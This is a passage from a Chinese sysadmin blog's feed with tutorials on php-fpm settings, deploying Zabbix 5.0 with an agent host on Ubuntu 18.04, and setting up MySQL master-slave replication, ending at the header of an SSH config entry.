&#x2F;usr&#x2F;local&#x2F;etc&#x2F;php-fpm.conf</span><br><span class="line"></span><br><span class="line">error_log &#x3D; &#x2F;var&#x2F;log&#x2F;php-fpm&#x2F;error.log</span><br><span class="line">log_level &#x3D; notice</span><br><span class="line">;process_max &#x3D; 0</span><br><span class="line">deamonize &#x3D; yes</span><br></pre></td></tr></table></figure><p>参数解析：</p><ul><li><code>error_log</code>：错误日志路径</li><li><code>log_level</code>：日志级别，默认为notice<ul><li><code>alert</code>：必须立即处理</li><li><code>error</code>：错误情况</li><li><code>warning</code>：警告情况</li><li><code>notice</code>：一般重要信息</li><li><code>debug</code>：调试信息</li></ul></li><li><code>process_max</code>：控制最大子进程数的全局变量，不建议设置具体数量，因为会限制扩展配置。</li><li><code>daemonize</code>：是否开启守护进程，默认为yes</li></ul><p>通常不会在<code>php-fpm.conf</code>中设定 <code>process_max</code>，因为会限制<code>www.conf</code>中的配置。</p><h3 id="3-扩展配置文件"><a href="#3-扩展配置文件" class="headerlink" title="3. 扩展配置文件"></a>3. 扩展配置文件</h3><p>扩展配置文件<code>www.conf</code>通常是与<code>php-fpm</code>服务相关的配置，大部分优化都是需要更改这个配置文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># vim &#x2F;usr&#x2F;local&#x2F;etc&#x2F;php-fpm.d&#x2F;www.conf</span><br><span class="line"></span><br><span class="line">listen &#x3D; 127.0.0.1:9000</span><br><span class="line">slowlog &#x3D; &#x2F;var&#x2F;log&#x2F;php-fpm&#x2F;www-slow.log</span><br><span class="line"></span><br><span class="line"># 这里按照10G 的空闲内存去设定</span><br><span class="line">pm &#x3D; dynamic</span><br><span class="line">pm.start_servers &#x3D; 16</span><br><span class="line">pm.max_children &#x3D; 256</span><br><span class="line">pm.min_spare_servers &#x3D; 16</span><br><span class="line">pm.max_spare_servers &#x3D; 32</span><br><span class="line">pm.max_requests &#x3D; 1000</span><br></pre></td></tr></table></figure><p>参数解析：</p><ul><li><code>listen</code>：有两种方式可以进行通讯。<ul><li><code>socket</code>：<code>unix:/run/php/php7.3-fpm.sock</code></li><li><code>http</code>：<code>127.0.0.1:9000</code> 因为<code>php-fpm</code>与<code>ngx_fastcgi_modul</code>的通讯方式是 9000端口，所以默认是 <code>127.0.0.1:9000</code></li></ul></li><li><code>slowlog</code>：慢查询日志路径</li><li><code>pm</code>：进程管理方式<ul><li><code>static</code>：静态模式。始终保持固定数量的子进程数，配合最大子进程数一起使用，这个方式很不灵活，通常不是默认。<ul><li><code>pm.max_children</code>：最大子进程数。</li></ul></li><li><code>dynamic</code>：动态模式。按照固定的最小子进程数启动，同时用最大子进程数去限制。<ul><li><code>pm.start_servers</code>：默认开启的进程数</li><li><code>pm.min_spare_servers</code>：最小空闲的进程数</li><li><code>pm.max_spare_servers</code>：最大空闲的进程数</li><li><code>pm.max_children</code>：最大子进程数</li><li><code>pm.max_requests</code>：每个进程能响应的请求数量，达到此限制之后，该PHP 进程就会被自动释放掉。</li></ul></li><li><code>nodaemonize</code>：每个进程在闲置一定时候后就会被杀掉。<ul><li><code>pm.max_children</code>：最大子进程数</li><li><code>pm.process_idle_timeout</code>：在多少秒之后，一个空闲的进程将会被杀死</li></ul></li></ul></li></ul><p>注意：<code>max_children</code> 是 PHPFPM Pool 最大的子进程数，它的数值取决于服务器实际空闲内存。假设你有一台10G 运行内存的服务器，我们知道一个空闲的PHP 进程占用的是 1M 内存，而一个正在处理请求的PHP 进程 大概会占用<code>10M-40M</code>内存，这里按照每个PHP 请求占用 40M 内存，那么<code>max_children = 10*1024M/40M = 256</code>，所以这个值得根据实际环境而设定。</p><p>以上就是<code>php-fpm</code> 初始化配置的核心部分了。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;code&gt;php-fpm&lt;/code&gt;（FastCGI Process Manger）是一个PHP FastCGI 管理器，专门和Nginx 的 &lt;code&gt;ngx_fastcgi_modul&lt;/code&gt;模块对接，用来处理动态请求。&lt;/p&gt;</summary>
    
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/categories/PHP/"/>
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/tags/PHP/"/>
    
    <category term="PHP-FPM" scheme="https://www.0x2beace.com/tags/PHP-FPM/"/>
    
  </entry>
  
  <entry>
    <title>Zabbix 快速上手——部署</title>
    <link href="https://www.0x2beace.com/zabbix-quick-start/"/>
    <id>https://www.0x2beace.com/zabbix-quick-start/</id>
    <published>2020-09-05T00:49:02.000Z</published>
    <updated>2020-12-06T15:14:35.561Z</updated>
    
    <content type="html"><![CDATA[<p>因为一些特殊原因，部分环境不是搭建在云上面，而是在托管的实体机上面，这就导致原本很多云可以帮我们做的事情，现在只能自己去做了。<br>比如：监控系统。</p><p>本着<strong>不想当运维的前端不是一个好全栈</strong>的思想，我迫切需要自己搭建一套完整的监控系统来解放自己的双手👐️。</p><a id="more"></a><p>我希望这套监控系统是怎样的？</p><ol><li>免费开源</li><li>入门相对容易</li><li>支持多平台分布式监控</li></ol><p>综合以上需求，最后我选择了 <a href="https://www.zabbix.com/" target="_blank" rel="noopener">Zabbix</a> 。</p><p>网上找了一圈，并没有发现合适的入门教程，要么是教程太老了，要么是写的不够详细，学习曲线很陡，光是部署就很费劲，而Zabbix 重要的不是部署，而是学会如何使用。</p><p>所以这篇笔记就是用来记录如何快速部署 Zabbix。</p><h2 id="认识-Zabbix"><a href="#认识-Zabbix" class="headerlink" title="认识 Zabbix"></a>认识 Zabbix</h2><p><a href="https://www.zabbix.com/" target="_blank" rel="noopener">Zabbix</a> 是一个企业级的分布式开源监控方案。</p><p>一个完整的监控系统是由服务机（zabbix server）和客户机（zabbix zgent）组成，运行大概流程是这样的：<br> <code>zabbix agent</code> 需要安装到被监控的主机上，它负责定期收集各项数据，并发送到 <code>zabbix server</code> 端，zabbix server将数据存储到自己的数据库中，<code>zabbix web</code>根据数据在前端进行展现和绘图。这里 agent 收集数据分为主动和被动两种模式：</p><ul><li>主动：agent 请求server 获取主动的监控项列表，并主动将监控项内需要检测的数据提交给 server/proxy 。</li><li>被动：server 向agent请求获取监控项的数据，agent返回数据。</li></ul><p>工作原理：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200905083643.png" alt=""></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>系统环境：</p><ul><li>Ubuntu 18.04 LTS</li><li>Mysql 5.7</li><li>PHP 7.2</li><li>Nginx </li><li>Zabbix 5.0</li></ul><h3 id="1-安装数据库"><a href="#1-安装数据库" class="headerlink" title="1. 安装数据库"></a>1. 安装数据库</h3><p>在正式安装之前，这里推荐先去<a href="https://www.zabbix.com/cn/download" target="_blank" rel="noopener">官网</a>找到符合自己的 Zabbix 服务器平台。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200902093733.png" alt=""></p><p>根据自己的实际环境来找到属于自己的下载链接，比如我是<code>Zabbix 5.0 + Ubuntu 18.04 + Mysql + Nginx</code>，所以我的安装方式应该是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ wget https:&#x2F;&#x2F;repo.zabbix.com&#x2F;zabbix&#x2F;5.0&#x2F;ubuntu&#x2F;pool&#x2F;main&#x2F;z&#x2F;zabbix-release&#x2F;zabbix-release_5.0-1+bionic_all.deb</span><br><span class="line">$ dpkg -i zabbix-release_5.0-1+bionic_all.deb</span><br><span class="line">$ apt update</span><br></pre></td></tr></table></figure><h3 id="2-安装Zabbix-server，Web前端，agent"><a href="#2-安装Zabbix-server，Web前端，agent" class="headerlink" title="2. 安装Zabbix server，Web前端，agent"></a>2. 安装Zabbix server，Web前端，agent</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ apt install zabbix-server-mysql zabbix-frontend-php zabbix-nginx-conf zabbix-agent</span><br></pre></td></tr></table></figure><ul><li>Zabbix Server：用来接收并处理 Zabbix agent 传过来的数据</li><li>Web 前端：Zabbix 的交互界面</li><li>Zabbix agent：需要被监控的主机</li></ul><h3 id="3-初始数据库"><a href="#3-初始数据库" class="headerlink" title="3. 初始数据库"></a>3. 初始数据库</h3><p>安装完数据库之后，并不能直接登录，因为不知道root 用户的密码，所以需要重置root 用户的密码，重置的方式有多种，这里推荐我常使用的的一种。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># vim &#x2F;etc&#x2F;mysql&#x2F;conf.d&#x2F;mysql.conf  </span><br><span class="line"># 也许你编辑的配置文件和我的名称不一样，不过没关系。</span><br><span class="line"></span><br><span class="line"># 添加下面两行配置</span><br><span class="line">[mysqld]</span><br><span class="line">skip-grant-tables</span><br></pre></td></tr></table></figure><p>重启Mysql 服务：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ service mysql restart</span><br></pre></td></tr></table></figure><p>现在的root 用户已经没有密码了，所以下一步要做的就是修改root 用户密码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ mysql -hlocalhost -uroot -p</span><br><span class="line"></span><br><span class="line">mysql &gt; UPDATE mysql.user SET authentication_string&#x3D;PASSWORD(&#39;password&#39;), plugin&#x3D;&#39;mysql_native_password&#39; WHERE User&#x3D;&#39;root&#39; AND Host&#x3D;&#39;localhost&#39;;</span><br></pre></td></tr></table></figure><p>然后再次修改刚才的配置文件，将下面那行配置给注释掉， 最后重启Mysql 服务就可以了。</p><p>Mysql 默认用户是root，这里不推荐直接使用 root 用户去管理 zabbix 数据库，所以还是使用官方推荐的方式，创建一个新的用户去管理：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ mysql -hlocalhost -uroot -p</span><br><span class="line"></span><br><span class="line">mysql&gt; create database zabbix character set utf8 collate utf8_bin;</span><br><span class="line">mysql&gt; create user zabbix@localhost identified by &#39;password&#39;;</span><br><span class="line">mysql&gt; grant all privileges on zabbix.* to zabbix@localhost;</span><br><span class="line">mysql&gt; flush privileges;</span><br><span class="line">mysql&gt; quit;</span><br></pre></td></tr></table></figure><p>这里默认Mysql 是运行在本地机器上，如果Mysql 运行在容器中，而Zabbix 又运行在本机上，可能会出现一些异常（我遇到了但没能解决）。</p><p>导入初始架构和数据。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ zcat &#x2F;usr&#x2F;share&#x2F;doc&#x2F;zabbix-server-mysql*&#x2F;create.sql.gz | mysql -uzabbix -p zabbix</span><br></pre></td></tr></table></figure><h3 id="4-配置数据库"><a href="#4-配置数据库" class="headerlink" title="4. 配置数据库"></a>4. 配置数据库</h3><p>为Zabbix server配置数据库，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># vim &#x2F;etc&#x2F;zabbix&#x2F;zabbix_server.conf</span><br><span class="line"></span><br><span class="line">DBPassword&#x3D;password</span><br></pre></td></tr></table></figure><h3 id="5-配置Web"><a href="#5-配置Web" class="headerlink" title="5. 配置Web"></a>5. 配置Web</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># vim &#x2F;etc&#x2F;zabbix&#x2F;nginx.conf</span><br><span class="line"></span><br><span class="line"># 去掉前面的注释，换成你自己的端口或者域名。</span><br><span class="line"># listen 80;</span><br><span class="line"># server_name example.com;</span><br></pre></td></tr></table></figure><h3 id="6-配置时区"><a href="#6-配置时区" class="headerlink" title="6. 配置时区"></a>6. 配置时区</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># vim &#x2F;etc&#x2F;zabbix&#x2F;php-fpm.conf</span><br><span class="line"></span><br><span class="line">php_value[date.timezone] &#x3D; Asia&#x2F;Shanghai</span><br></pre></td></tr></table></figure><h3 id="7-启动服务"><a href="#7-启动服务" class="headerlink" title="7. 启动服务"></a>7. 启动服务</h3><p>启动Zabbix server和agent 进程，并为它们设置开机自启：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ systemctl restart zabbix-server zabbix-agent nginx php7.2-fpm</span><br><span class="line">$ systemctl enable zabbix-server zabbix-agent nginx php7.2-fpm</span><br></pre></td></tr></table></figure><p>一切准备就绪之后，就可以访问了：<code>http://server_ip_or_name</code>，如果你上面配置的不是80 端口，那得记得加上对应的端口。如果你不能正常访问，那可能是因为防火墙没有允许该端口。</p><p>初次进来，需要配置相关参数，确认无误之后，点击 Next step。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200902105706.png" alt=""></p><p>Zabbix 默认的用户名和密码是<code>Admin</code>、<code>zabbix</code>，顺利登录到后台之后，记得修改默认登录密码。</p><h2 id="配置中文语言包"><a href="#配置中文语言包" class="headerlink" title="配置中文语言包"></a>配置中文语言包</h2><p>如果需要设置中文版的环境，需要做一些额外的配置。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ vim &#x2F;usr&#x2F;share&#x2F;zabbix&#x2F;include&#x2F;locales.inc.php</span><br></pre></td></tr></table></figure><p>将zh_CN 后面参数改为 true。</p><p>如果在选择语言时，发现还是不能选择，并且提示：</p><blockquote><p>You are not able to choose some of the languages, because locales for them are not installed on the web server.</p></blockquote><p>这是因为你系统里没中文环境，查看当前的所有系统语言环境</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ locale -a</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200902110702.png" alt=""></p><h3 id="1-安装中文包"><a href="#1-安装中文包" class="headerlink" title="1. 安装中文包"></a>1. 安装中文包</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install language-pack-zh-hant language-pack-zh-hans</span><br></pre></td></tr></table></figure><h3 id="2-配置环境变量"><a href="#2-配置环境变量" class="headerlink" title="2. 配置环境变量"></a>2. 配置环境变量</h3><p>增加语言和编码的设置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># vim &#x2F;etc&#x2F;environment</span><br><span class="line"></span><br><span class="line">LANG&#x3D;&quot;zh_CN.UTF-8&quot;</span><br><span class="line">LANGUAGE&#x3D;&quot;zh_CN:zh:en_US:en&quot;</span><br></pre></td></tr></table></figure><h3 id="3-替换Zabbix-语言包"><a href="#3-替换Zabbix-语言包" class="headerlink" title="3. 替换Zabbix 语言包"></a>3. 替换Zabbix 语言包</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ cd cd &#x2F;usr&#x2F;share&#x2F;zabbix&#x2F;locale&#x2F;zh_CN&#x2F;LC_MESSAGES</span><br><span class="line">$ wget https:&#x2F;&#x2F;github.com&#x2F;echohn&#x2F;zabbix-zh_CN&#x2F;archive&#x2F;v0.1.0.zip</span><br><span class="line">$ unzip master.zip</span><br><span class="line">$ rm frontend.mo</span><br><span class="line">$ cp zabbix-zh_CN-master&#x2F;frontend.mo frontend.mo</span><br></pre></td></tr></table></figure><h3 id="4-解决乱码问题"><a href="#4-解决乱码问题" class="headerlink" title="4. 解决乱码问题"></a>4. 解决乱码问题</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ wget https:&#x2F;&#x2F;github.com&#x2F;chenqing&#x2F;ng-mini&#x2F;blob&#x2F;master&#x2F;font&#x2F;msyh.ttf</span><br><span class="line">$ vim &#x2F;usr&#x2F;share&#x2F;zabbix&#x2F;include&#x2F;defines.inc.php</span><br><span class="line"></span><br><span class="line"># 找到 define(&#39;ZBX_GRAPH_FONT_NAME&#39;, &#39;graphfont&#39;);</span><br><span class="line"># 将graphfont 替换成 msyh</span><br></pre></td></tr></table></figure><h3 id="5-更新mibs-库"><a href="#5-更新mibs-库" class="headerlink" title="5. 更新mibs 库"></a>5. 更新mibs 库</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ apt-get install snmp-mibs-downloader</span><br></pre></td></tr></table></figure><h3 id="6-重启服务"><a href="#6-重启服务" class="headerlink" title="6. 重启服务"></a>6. 重启服务</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ systemctl restart zabbix-server zabbix-agent php7.2-fpm</span><br></pre></td></tr></table></figure><p>至此Zabbix 的完整部署过程就全介绍完了。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://www.cnblogs.com/zangdalei/p/5712951.html" target="_blank" rel="noopener">Zabbix 3.0 for Ubuntu 14.04 LTS 安装</a></li><li><a href="https://www.zabbix.com/cn/download?zabbix=5.0&os_distribution=ubuntu&os_version=18.04_bionic&db=mysql&ws=nginx" target="_blank" rel="noopener">下载安装Zabbix——Zabbix 官网</a></li><li><a href="https://yq.aliyun.com/articles/611489" target="_blank" rel="noopener">企业级分布式监控系统–zabbix</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;因为一些特殊原因，部分环境不是搭建在云上面，而是在托管的实体机上面，这就导致原本很多云可以帮我们做的事情，现在只能自己去做了。&lt;br&gt;比如：监控系统。&lt;/p&gt;
&lt;p&gt;本着&lt;strong&gt;不想当运维的前端不是一个好全栈&lt;/strong&gt;的思想，我迫切需要自己搭建一套完整的监控系统来解放自己的双手👐️。&lt;/p&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/categories/Linux/"/>
    
    <category term="Zabbix" scheme="https://www.0x2beace.com/categories/Linux/Zabbix/"/>
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/tags/Linux/"/>
    
    <category term="Zabbix" scheme="https://www.0x2beace.com/tags/Zabbix/"/>
    
    <category term="监控系统" scheme="https://www.0x2beace.com/tags/%E7%9B%91%E6%8E%A7%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>Zabbix 快速上手——添加Agent 主机</title>
    <link href="https://www.0x2beace.com/zabbix-add-agent-host/"/>
    <id>https://www.0x2beace.com/zabbix-add-agent-host/</id>
    <published>2020-09-04T13:48:16.000Z</published>
    <updated>2020-09-08T13:03:21.864Z</updated>
    
    <content type="html"><![CDATA[<p>Zabbix-Server 安装完成之后，下一步需要添加主机才能看到数据。</p><a id="more"></a><h2 id="安装Zabbix-Agent"><a href="#安装Zabbix-Agent" class="headerlink" title="安装Zabbix Agent"></a>安装Zabbix Agent</h2><p>Zabbix Agent 的作用是将服务器的数据发送给 Zabbix Server，所以只需要在需要监控的主机上安装 Zabbix Agent 就够了。</p><p>因为我的环境是：<code>Ubuntu 18.04</code>、<code>Nginx</code>、<code>Mysql</code>、<code>PHP</code>，根据<a href="https://www.zabbix.com/cn/download" target="_blank" rel="noopener">官网</a>的选择对应的下载链接。</p><p>在有了<code>Mysql</code> 和 <code>Nginx</code>的情况下，这里我只选择安装 <code>Zabbix Agent</code>，如果没有的话，那就需要额外安装<code>zabbix-mysql</code>、<code>zabbix-nginx-conf</code>、<code>zabbix-frontend-php</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ wget https:&#x2F;&#x2F;repo.zabbix.com&#x2F;zabbix&#x2F;5.0&#x2F;ubuntu&#x2F;pool&#x2F;main&#x2F;z&#x2F;zabbix-release&#x2F;zabbix-release_5.0-1+bionic_all.deb</span><br><span class="line">$ dpkg -i zabbix-release_5.0-1+bionic_all.deb</span><br><span class="line">$ apt update</span><br><span class="line">$ apt install zabbix-agent</span><br></pre></td></tr></table></figure><h2 id="配置-Zabbix-Agent"><a href="#配置-Zabbix-Agent" class="headerlink" title="配置 Zabbix Agent"></a>配置 Zabbix Agent</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># vim &#x2F;etc&#x2F;zabbix&#x2F;zabbix_agentd.conf</span><br><span class="line"></span><br><span class="line">Server：Zabbix Server 的IP 地址</span><br><span class="line">ServerActive：Zabbix Server 的IP 地址</span><br><span class="line">Hostname：Zabbix Agent 这台主机的别名</span><br></pre></td></tr></table></figure><p>核心的配置只有这三行，改完之后，重启以下 Zabbix Agent。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ systemctl restart zabbix-agent</span><br></pre></td></tr></table></figure><h2 id="添加主机"><a href="#添加主机" class="headerlink" title="添加主机"></a>添加主机</h2><p>完成以上配置之后，下一步需要做的就是打开 Zabbix 的Web 端，开始添加主机。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200904200443.png" alt=""></p><p>配置主机基础信息：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200904205302.png" alt=""></p><ul><li>主机名称：zabbix_agentd.conf 中的Hostname</li><li>客户端IP：需要监控的主机的IP 地址</li><li>端口默认使用 10050</li></ul><p>配置模版：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200904213331.png" alt=""></p><p>需要注意的是，如果没有配置模版，可能会导致没有数据。</p><p>然后点击添加即可。</p><p>打开监控面板，点击主机，正常情况下，主机状态应该是这样的。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200904214447.png" alt=""></p><p>至此就完成了Agent 的添加，点击最新数据或者图形可以看到相应的数据。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://blog.51cto.com/dyc2005/1971212" target="_blank" rel="noopener">安装zabbix-agent并添加到zabbix web中监控</a></li><li><a href="https://blog.csdn.net/kk185800961/article/details/84105621" target="_blank" rel="noopener">Zabbix 使用 Zabbix-Agent 添加新的Linux服务器监控</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;Zabbix-Server 安装完成之后，下一步需要添加主机才能看到数据。&lt;/p&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/categories/Linux/"/>
    
    <category term="Zabbix" scheme="https://www.0x2beace.com/categories/Linux/Zabbix/"/>
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/tags/Linux/"/>
    
    <category term="Zabbix" scheme="https://www.0x2beace.com/tags/Zabbix/"/>
    
  </entry>
  
  <entry>
    <title>Mysql 主从架构配置</title>
    <link href="https://www.0x2beace.com/mysql-master-slave-architecture-configuration/"/>
    <id>https://www.0x2beace.com/mysql-master-slave-architecture-configuration/</id>
    <published>2020-09-03T15:40:16.000Z</published>
    <updated>2020-09-03T15:43:51.804Z</updated>
    
    <content type="html"><![CDATA[<p>Mysql 主从配置是数据库同步的必要步骤。</p><a id="more"></a><p>主机环境：</p><ul><li>Ubuntu 18.04 LTS</li><li>Mysql 5.7</li></ul><p>下面会将主数据库简称为Master，从数据库简称为 Slave。</p><h2 id="配置Master"><a href="#配置Master" class="headerlink" title="配置Master"></a>配置Master</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># vim &#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf</span><br><span class="line"></span><br><span class="line"># 打开二进制日志</span><br><span class="line">[mysqld]</span><br><span class="line">server_id&#x3D;1</span><br><span class="line">log-bin&#x3D;master-bin</span><br><span class="line">log-bin-index&#x3D;master-bin.index</span><br></pre></td></tr></table></figure><p>创建同步用户，并赋予权限（如果从服务器以reql 这个账号进行连接，就赋予同步数据库的权限，并且这个权限是所有数据库的所有数据表）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ mysql -uroot -p </span><br><span class="line">mysql&gt; create user repl;</span><br><span class="line">mysql&gt; grant replication slave on *.* to &#39;user&#39;@&#39;your_slave_addr&#39; identified by &#39;password&#39;</span><br><span class="line">mysql&gt; flush privileges;</span><br></pre></td></tr></table></figure><p>上面的IP 是指 Slave 服务器的IP 地址。<br>重启Mysql 服务。</p><p>查看Master 配置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show master status;</span><br></pre></td></tr></table></figure><h2 id="Salve-配置"><a href="#Salve-配置" class="headerlink" title="Salve 配置"></a>Salve 配置</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># vim &#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf</span><br><span class="line"></span><br><span class="line"># 打开relay 日志</span><br><span class="line">[mysqld]</span><br><span class="line">server_id&#x3D;2</span><br><span class="line">relay-log-index&#x3D;slave-relay-bin.index</span><br><span class="line">relay-log&#x3D;slave-relay-bin</span><br></pre></td></tr></table></figure><p>重启Mysql 服务。</p><p>指定Master 主机</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ mysql -uroot -p</span><br><span class="line">mysql&gt; change master to master_host&#x3D;&quot;your master ip &quot;, master_port&#x3D;3306, master_user&#x3D;&#39;repl&#39;,master_password&#x3D;&#39;password&#39;,master_log_file&#x3D;&#39;master-bin.000001&#39;,master_log_pos&#x3D;0;</span><br></pre></td></tr></table></figure><p>参数说明：</p><ul><li><code>master_host</code>：Master∑主机的外网IP 地址</li><li><code>master_port</code>：端口</li><li><code>master_user</code>：Master主机上进行同步的用户</li><li><code>master_password</code>：密码</li><li><code>master_log_file</code>：Master 输出的二进制文件的名称（在Master 主机上使用<code>show master status</code>命令查看）</li><li><code>master_log_pos</code>：哪里开始同步</li></ul><p>开启主从同步</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; start slave;</span><br></pre></td></tr></table></figure><p>查看从库同步状态</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show slave status;</span><br></pre></td></tr></table></figure><h3 id="可能会遇到的问题"><a href="#可能会遇到的问题" class="headerlink" title="可能会遇到的问题"></a>可能会遇到的问题</h3><blockquote><p>Last_Errno: 1146<br>  Last_Error: Error executing row event: ‘Table ‘panda.t’ doesn’t exist’</p></blockquote><p>解决办法：使用<code>slave-skip-errors</code> 参数跳过该错误。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># vim &#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf</span><br><span class="line"></span><br><span class="line">[mysqld]</span><br><span class="line">slave_skip_errors&#x3D;1146</span><br></pre></td></tr></table></figure><p>重启从库即可。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Mysql 主从配置是数据库同步的必要步骤。&lt;/p&gt;</summary>
    
    
    
    <category term="Mysql" scheme="https://www.0x2beace.com/categories/Mysql/"/>
    
    
    <category term="Mysql" scheme="https://www.0x2beace.com/tags/Mysql/"/>
    
  </entry>
  
  <entry>
    <title>了解 SSH Config</title>
    <link href="https://www.0x2beace.com/understand-ssh-config/"/>
    <id>https://www.0x2beace.com/understand-ssh-config/</id>
    <published>2020-09-02T15:58:02.000Z</published>
    <updated>2020-09-02T15:58:54.842Z</updated>
    
